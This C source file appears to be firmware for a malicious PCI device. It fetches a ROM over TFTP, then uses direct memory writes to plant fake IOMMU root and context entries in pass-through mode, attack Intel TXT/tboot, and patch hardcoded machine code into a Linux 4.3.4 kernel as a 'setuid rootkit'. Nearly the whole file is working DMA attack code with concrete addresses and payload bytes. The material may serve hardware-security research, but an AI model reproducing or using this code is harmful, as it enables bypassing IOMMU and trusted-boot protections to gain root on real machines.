#include <string.h>
#include <net/microudp.h>
#include <hm.h>
#include <hw/hm.h>
#include <net/tftp.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <system.h>
#include <endian.h>

static inline void wait(void) {
  int z, k;
  for (k=0; k < 0x100; k++)
    for (z=0; z< 0x100; z++)
      asm("nop;");
}

static inline void waitn(unsigned int n) {
  int k;
  for (k=0; k < n; k++)
    asm("nop;");
}

int exp_raw_dl(char *name, unsigned char *mac, unsigned char *lip, unsigned
    char *rip) {
  int r;
  if (name == NULL || strlen(name) == 0) {
    return -1;
  }

  printf("Raw expansion rom dl\n");

  microudp_start(mac, IPTOINT(lip[0], lip[1], lip[2], lip[3]));
  int ip = IPTOINT(rip[0], rip[1], rip[2], rip[3]);

  // Get the challenge
  r = tftp_get(ip, name, (char *)&HM_BAR_ADDR);
  if (r == -1) {
    printf("Failed to download : %s\n", name);
    return r;
  }
  printf("Received %d bytes\n", r);
  flush_cpu_dcache();
  return r;
}

// Write fake root entry containing addr address to fake context entry
// addr @0xd0000000
// addr |= 0x50 pour 05:00.0
int iommu_pwn(unsigned int addr) {
  uint32_t low, high;
  // With hypervisor
  low = 0x0bb18050;
  high = 0x00000004;
  addr |= 1; // Bit present
  hm_start_write_pwn(low, high, le32toh(addr));
  return 0;
}

// low : @0xd0000000
int iommu_pwn_page(unsigned int low, unsigned int high) {
  uint32_t i, j;
  uint32_t data[4] = { // Big endian
    0x09000000, // type = pass through, present = 1
    0x00000000,
    0x02000000, // virtual address width = 2 (48 bits)
    0x00000000
  };
  printf("write fake context entry 256 times starting @ 0x%08x%08x\n", high,
      low);
  for (i = 0; i < 256; i++) { // 256 entries of 128 bits each
    for (j = 0; j < 4; j++) {
      if (hm_start_write(low + i * 0x10 + j * 0x4, high, data[j], 0)) {
        return 1;
      }
    }
  }
  return 0;
}

void iommu_pwn_wait_for_bar(void) {
  printf("IOMMU PWN: Wait for tboot bar write\n");
  HM_BAR_CTRL |= HM_BAR_CTRL_EN;
  while ((HM_BAR_CTRL & HM_BAR_CTRL_EN) == HM_BAR_CTRL_EN) {
    wait();
    printf("WAIT FOR BAR WRITE (0x%08x)\n", HM_BAR_CTRL);
  }
}

// Intel TxT PWN
void iommu_pwn_txt(unsigned int n) {
  iommu_pwn_wait_for_bar();
  wait();
  waitn(n);
  // hm_start_read(0x0, 0x0);
  hm_start_write(0x82a000, 0x0, 0xcafebabe, 1);
  // hm_start_write(0x803130, 0x0, le32toh(0x804001), 0);
  // hm_start_write(0x803130, 0x0, le32toh(0x804000), 0);
  printf("DONE!\n");
}

// Linux setuid rootkit linux-4.3.4
// low is @ : 0x010869b9, high is @0
void iommu_pwn_rootkit_linux(void) {
  uint32_t low = 0x01086998, high = 0;
  uint32_t code[] = {
		0x31db4189,
		0x5c241441,
		0x895c241c,
		0xeb096690,
		0x90909090
  };
  uint32_t i;
  for (i = 0; i < sizeof(code) / 4; i++) {
	  hm_start_write(low + i * 4, high, code[i], 0);
  }
}
